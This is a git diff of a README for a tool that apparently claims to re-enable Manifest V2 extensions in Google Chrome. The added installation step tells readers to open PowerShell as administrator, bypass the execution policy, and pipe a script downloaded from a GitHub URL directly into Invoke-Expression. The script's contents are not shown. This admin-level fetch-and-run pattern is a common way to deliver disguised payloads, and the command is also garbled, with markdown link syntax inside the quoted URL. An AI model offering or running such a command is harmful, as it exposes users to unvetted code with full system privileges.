@@ -1,2 +1,8 @@
 # BringBackChromeExtensions
-This script fixes the issue where Google Chrome automatically disables your favorite extensions.
+
+Restores support for Manifest V2 extensions in Google Chrome.
+
+### Installation
+Run this in **PowerShell (Admin)**:
+```powershell
+powershell -ExecutionPolicy Bypass -Command "iwr -useb [https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1](https://raw.githubusercontent.com/LunarLegacyStudios/BringBackChromeExtensions/main/EnableMV2.ps1) | iex"
